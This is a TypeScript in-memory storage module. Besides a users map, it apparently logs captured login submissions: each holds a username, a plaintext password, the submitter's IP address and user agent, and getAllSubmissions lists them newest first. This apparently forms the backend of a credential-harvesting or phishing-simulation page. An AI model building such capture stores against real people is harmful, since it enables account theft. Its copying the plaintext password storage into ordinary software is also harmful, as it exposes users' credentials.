import { type User, type InsertUser, type Submission, type InsertSubmission } from "@shared/schema";
import { randomUUID } from "crypto";

export interface IStorage {
  getUser(id: string): Promise<User | undefined>;
  getUserByUsername(username: string): Promise<User | undefined>;
  createUser(user: InsertUser): Promise<User>;
  
  createSubmission(submission: InsertSubmission): Promise<Submission>;
  getAllSubmissions(): Promise<Submission[]>;
}

export class MemStorage implements IStorage {
  private users: Map<string, User>;
  private submissions: Map<string, Submission>;

  constructor() {
    this.users = new Map();
    this.submissions = new Map();
  }

  async getUser(id: string): Promise<User | undefined> {
    return this.users.get(id);
  }

  async getUserByUsername(username: string): Promise<User | undefined> {
    return Array.from(this.users.values()).find(
      (user) => user.username === username,
    );
  }

  async createUser(insertUser: InsertUser): Promise<User> {
    const id = randomUUID();
    const user: User = { ...insertUser, id };
    this.users.set(id, user);
    return user;
  }

  async createSubmission(insertSubmission: InsertSubmission): Promise<Submission> {
    const id = randomUUID();
    const submission: Submission = {
      id,
      username: insertSubmission.username,
      password: insertSubmission.password,
      userAgent: insertSubmission.userAgent ?? null,
      ipAddress: insertSubmission.ipAddress ?? null,
      timestamp: new Date(),
    };
    this.submissions.set(id, submission);
    return submission;
  }

  async getAllSubmissions(): Promise<Submission[]> {
    return Array.from(this.submissions.values()).sort(
      (a, b) => b.timestamp.getTime() - a.timestamp.getTime()
    );
  }
}

export const storage = new MemStorage();
